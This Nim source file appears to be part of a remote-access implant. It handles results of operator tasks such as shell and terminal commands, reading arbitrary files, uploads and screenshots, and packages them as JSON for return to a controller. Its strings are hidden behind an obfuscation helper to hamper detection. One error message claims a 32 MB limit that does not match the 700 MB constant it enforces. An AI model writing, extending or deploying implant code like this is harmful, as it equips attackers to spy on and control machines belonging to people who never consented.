import std/[json, strutils]
import ../global
import ../linapi/handlers
import ../linapi/utils
import ./tasks as tasks

const tasks_buffer_max* = 700'u64 * 1024 * 1024
const task_buffer_floor* = 4096

proc calculateBufferSize*(contentLen: int; work: tasks.TaskRecord): (int, bool) =
  # Calculates how large a task buffer must be and whether it fits
  let workerTask = work.mode.len > 0 or work.cmdType.len > 0
  if not workerTask:
    if contentLen.uint64 > tasks_buffer_max:
      return (0, false)
    if contentLen <= 0:
      return (task_buffer_floor, true)
    return (max(task_buffer_floor, contentLen), true)
  if work.mode == obf("upload"):
    return (task_buffer_floor, true)
  if work.mode == obf("cat") and work.args.len > 0:
    let sz = getPathSize(work.args.strip())
    if sz < 0:
      return (task_buffer_floor, true)
    if uint64(sz) > tasks_buffer_max:
      return (0, false)
    return (max(task_buffer_floor, sz.int + 1), true)
  if work.mode == obf("shell"):
    let n = min(int(tasks_buffer_max), max(task_buffer_floor, readTextMax))
    return (n, true)
  var need = task_buffer_floor
  if work.input.len > need:
    need = work.input.len
  if work.args.len > need:
    need = work.args.len
  if need.uint64 > tasks_buffer_max:
    return (0, false)
  return (need, true)

proc create_json*(work: tasks.TaskRecord; raw: string; failed: bool): string =
  # Builds the json result for a finished task
  if work.cmdType == obf("terminal"):
    var termOut =
      if failed:
        if raw.len > 0: raw else: obf("Command failed")
      else:
        raw
    let shell = $(%*{
      obf("option"): obf("output"),
      obf("type"): obf("terminal"),
      obf("task_tag"): work.tag,
      obf("output"): "",
    })
    let maxOut = int(tasks_buffer_max) - shell.len
    if maxOut > 0 and termOut.len > maxOut:
      termOut = obf("Output is too big (>=32 MB)")
    elif maxOut <= 0:
      termOut = obf("Output is too big (>=32 MB)")
    let termJson = $(%*{
      obf("option"): obf("output"),
      obf("type"): obf("terminal"),
      obf("task_tag"): work.tag,
      obf("output"): termOut,
    })
    return termJson
  if failed:
    return $(%*{
      obf("option"): obf("output"),
      obf("type"): work.cmdType,
      obf("host"): work.host,
      obf("task_tag"): work.tag,
      obf("error"): if raw.len > 0: raw else: obf("Command failed"),
    })
  raw

proc apply_task_output*(body: string; params: string = obf("{}"); taskTag: string = ""): uint32 =
  # Stores task output and returns the new task id
  var tag = taskTag
  if tag.len == 0:
    let (_, ok) = calculateBufferSize(body.len, tasks.TaskRecord())
    if ok:
      try:
        let j = parseJson(body)
        if j.hasKey(obf("task_tag")):
          tag = j[obf("task_tag")].getStr()
      except JsonParsingError:
        discard
  if body.len == 0:
    return 0
  let (_, ok) = calculateBufferSize(body.len, tasks.TaskRecord())
  if not ok:
    return 0
  if contains(body, obf("\"type\":\"screenshot\"")):
    var drop: seq[uint32] = @[]
    let order = tasks.taskOrder
    for id in order:
      let (ok, t) = tasks.read_task(id)
      if ok and contains(t.result, obf("\"type\":\"screenshot\"")):
        drop.add id
    for id in drop:
      discard tasks.delete_task(id)
  let id = tasks.create_task(tasks.TaskRecord(
    tag: tag,
    cmdType: obf("output"),
    params: params,
    result: body,
    done: true,
    pendingOut: true,
  ))
  id
